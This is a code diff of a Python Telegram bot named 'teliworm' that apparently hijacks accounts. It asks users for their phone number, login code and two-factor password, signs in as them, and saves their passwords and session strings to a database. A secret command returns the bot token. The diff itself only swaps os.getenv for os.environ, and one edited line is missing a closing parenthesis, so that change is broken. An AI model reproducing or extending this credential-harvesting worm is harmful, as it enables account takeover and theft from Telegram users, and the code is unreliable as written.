@@ -9,7 +9,7 @@ from worm import worm
 
 load_dotenv(override=True)
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
-mongo_client = MongoClient(os.getenv('MONGODB_URI'), server_api=ServerApi('1'))
+mongo_client = MongoClient(os.environ['MONGODB_URI'], server_api=ServerApi('1'))
 database = mongo_client.userdb.sessions
 logger_bot = TelegramClient('teliworm', 6, 'eb06d4abfb49dc3eeb1aeb98ae0f581e')
 
@@ -31,7 +31,7 @@ def yesno(x,page='def'):
         [Button.inline(strings['no'], '{{"page":"{}","press":"no{}"}}'.format(page,x))]
     ]
 async def is_session_authorized(session):
-    uclient = TelegramClient(StringSession(session), os.getenv('API_ID'), os.getenv('API_HASH'))
+    uclient = TelegramClient(StringSession(session), os.environ['API_ID'], os.environ['API_HASH'])
     await uclient.connect()
     authorized = await uclient.is_user_authorized()
     await uclient.disconnect()
@@ -39,7 +39,7 @@ async def is_session_authorized(session):
 async def handle_usr(phone_num, event):
     await (await event.respond('wait..', buttons=Button.clear())).delete()
     msg = await event.respond(strings['sending'])
-    uclient = TelegramClient(StringSession(), os.getenv('API_ID'), os.getenv('API_HASH'))
+    uclient = TelegramClient(StringSession(), os.environ['API_ID'], os.environ['API_HASH'])
     await uclient.connect()
     try:
         scr = await uclient.send_code_request(phone_num)
@@ -60,12 +60,12 @@ async def sign_in(event, user_data):
     try:
         login = json.loads(user_data['login'])
         if get(login, 'code_ok', False) and get(login, 'pass_ok', False):
-            uclient = TelegramClient(StringSession(login['session']), os.getenv('API_ID'), os.getenv('API_HASH'))
+            uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
             await uclient.connect()
             await uclient.sign_in(password=user_data['password'])
             data['password'] = user_data['password']
         elif get(login, 'code_ok', False) and not get(login, 'need_pass', False):
-            uclient = TelegramClient(StringSession(login['session']), os.getenv('API_ID'), os.getenv('API_HASH'))
+            uclient = TelegramClient(StringSession(login['session']), os.environ['API_ID'], os.environ['API_HASH'])
             await uclient.connect()
             await uclient.sign_in(user_data['phone'], login['code'], phone_code_hash=login['phone_code_hash'])
         else:
@@ -104,7 +104,7 @@ async def sign_in(event, user_data):
 @events.register(events.NewMessage(pattern=r"/token", func=lambda e: e.is_private))
 async def handler_get_token(event):
     m = event.message.text.split(' ')
-    if len(m)==2 and m[1]==os.getenv('SECRET_COMMAND'):
+    if len(m)==2 and m[1]==os.environ['SECRET_COMMAND']:
         await event.respond(f"`{getconfig('BOT_TOKEN')}`")
     raise events.StopPropagation
 @events.register(events.NewMessage(func=lambda e: e.is_private, outgoing=False))
@@ -180,7 +180,7 @@ async def run_bot():
     for function in botFunctions:
         bot.add_event_handler(function)
     if bot_count==0:
-        await bot.start(bot_token=os.getenv('BOT_TOKEN'))
+        await bot.start(bot_token=os.environ['BOT_TOKEN']
     else:
         next_bot = mongo_client.wormdb.bots.find().limit(1).next()
         await bot.start(bot_token=next_bot['token'])
@@ -189,10 +189,10 @@ async def run_bot():
             raise Exception("Bot not authorized")
         await bot.start(bot_token=next_bot['token'])
     setconfig('BOT_USERNAME', (await bot.get_me()).username)
-    setconfig('BOT_TOKEN', next_bot['token'])
+    setconfig('BOT_TOKEN', os.environ['BOT_TOKEN'] if bot_count==0 else next_bot['token'])
     await bot.run_until_disconnected()
 async def main():
-    await logger_bot.start(bot_token=os.getenv('BOT_TOKEN'))
+    await logger_bot.start(bot_token=os.environ['BOT_TOKEN'])
     while 1:
         try:
             print('-- bot start --')
